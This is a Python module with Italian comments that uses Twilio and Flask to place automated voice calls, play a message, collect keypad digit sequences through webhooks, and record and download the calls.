import os
import threading
from datetime import datetime
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather, Redirect
from flask import Flask, request, Response
import requests

from config import *

RECORDINGS_DIR = "recordings"
os.makedirs(RECORDINGS_DIR, exist_ok=True)

twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# Dizionario per salvare i tasti premuti per chiamata
keypress_results = {}

def make_phone_call(to_number: str, from_country_prefix: str, message: str, language: str = "it") -> dict:
    """Effettua una chiamata"""
    full_number = f"{from_country_prefix}{to_number}"
    
    print(f"📞 Chiamata verso: {full_number}")
    print(f"📝 Messaggio: {message[:100]}...")
    
    base_url = f"https://{NGROK_URL}" if NGROK_URL else "http://localhost:5000"
    
    response = VoiceResponse()
    
    # 1. Messaggio principale
    response.say(message, voice="alice", language="it-IT", loop=1)
    
    # 2. Raccoglie PIÙ TASTI (fino a 10, o quando preme #)
    gather = Gather(
        num_digits=10,          # Raccoglie fino a 10 tasti
        action=f"{base_url}/webhook/keypress",
        method="POST",
        timeout=5,              # Aspetta 5 secondi dopo l'ultimo tasto
        finishOnKey="#"         # Il # termina la raccolta
    )
    response.append(gather)
    
    # 3. Se non preme tasti, riprova
    response.redirect(f"{base_url}/webhook/wait", method="POST")
    
    try:
        call = twilio_client.calls.create(
            to=full_number,
            from_=TWILIO_PHONE_NUMBER,
            twiml=str(response),
            record=True
        )
        
        print(f"✅ Chiamata avviata! Call SID: {call.sid}")
        keypress_results[call.sid] = []
        
        return {
            "call_sid": call.sid,
            "status": call.status,
            "success": True
        }
    except Exception as e:
        print(f"❌ Errore: {e}")
        return {
            "call_sid": None,
            "status": "failed",
            "success": False,
            "error": str(e)
        }


def create_webhook_app():
    """Crea app Flask per webhook Twilio"""
    flask_app = Flask(__name__)
    
    @flask_app.route('/webhook/voice', methods=['POST'])
    def voice_webhook():
        from_number = request.form.get('From', '')
        print(f"📞 Chiamata in arrivo da {from_number}")
        
        response = VoiceResponse()
        response.say("Benvenuto. Grazie per aver chiamato.", voice="alice", language="it-IT")
        return Response(str(response), mimetype='text/xml')
    
    @flask_app.route('/webhook/wait', methods=['POST'])
    def wait_webhook():
        call_sid = request.form.get('CallSid', '')
        print(f"⏳ In attesa di tasti per chiamata {call_sid}")
        
        base_url = f"https://{NGROK_URL}" if NGROK_URL else "http://localhost:5000"
        
        response = VoiceResponse()
        gather = Gather(
            num_digits=10,
            action=f"{base_url}/webhook/keypress",
            method="POST",
            timeout=5,
            finishOnKey="#"
        )
        response.append(gather)
        response.redirect(f"{base_url}/webhook/wait", method="POST")
        
        return Response(str(response), mimetype='text/xml')
    
    @flask_app.route('/webhook/keypress', methods=['POST'])
    def keypress_webhook():
        call_sid = request.form.get('CallSid', '')
        digits = request.form.get('Digits', '')
        from_number = request.form.get('From', '')
        
        print(f"🔢 SEQUENZA TASTI RILEVATA: {digits} da {from_number}")
        
        if call_sid not in keypress_results:
            keypress_results[call_sid] = []
        
        # Salva l'INTERA SEQUENZA
        keypress_results[call_sid].append({
            "digits": digits,
            "timestamp": datetime.now().isoformat(),
            "from": from_number
        })
        
        # Continua ad ascoltare
        base_url = f"https://{NGROK_URL}" if NGROK_URL else "http://localhost:5000"
        
        response = VoiceResponse()
        gather = Gather(
            num_digits=10,
            action=f"{base_url}/webhook/keypress",
            method="POST",
            timeout=5,
            finishOnKey="#"
        )
        response.append(gather)
        response.redirect(f"{base_url}/webhook/wait", method="POST")
        
        return Response(str(response), mimetype='text/xml')
    
    return flask_app


def start_webhook_server():
    flask_app = create_webhook_app()
    
    def run():
        flask_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
    
    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    print("✅ Server webhook avviato sulla porta 5000")
    return thread


def get_call_recording(call_sid: str) -> str:
    try:
        recordings = twilio_client.recordings.list(call_sid=call_sid)
        if recordings:
            recording = recordings[0]
            return f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_ACCOUNT_SID}/Recordings/{recording.sid}.mp3"
        return None
    except Exception as e:
        print(f"Errore recupero registrazione: {e}")
        return None


def download_recording_file(recording_url: str, call_sid: str) -> str:
    local_file = os.path.join(RECORDINGS_DIR, f"recording_{call_sid}.mp3")
    
    try:
        response = requests.get(
            recording_url,
            auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
        )
        
        if response.status_code == 200:
            with open(local_file, 'wb') as f:
                f.write(response.content)
            return local_file
        return None
    except Exception as e:
        print(f"Errore download: {e}")
        return None


def get_keypress_results(call_sid: str) -> list:
    return keypress_results.get(call_sid, [])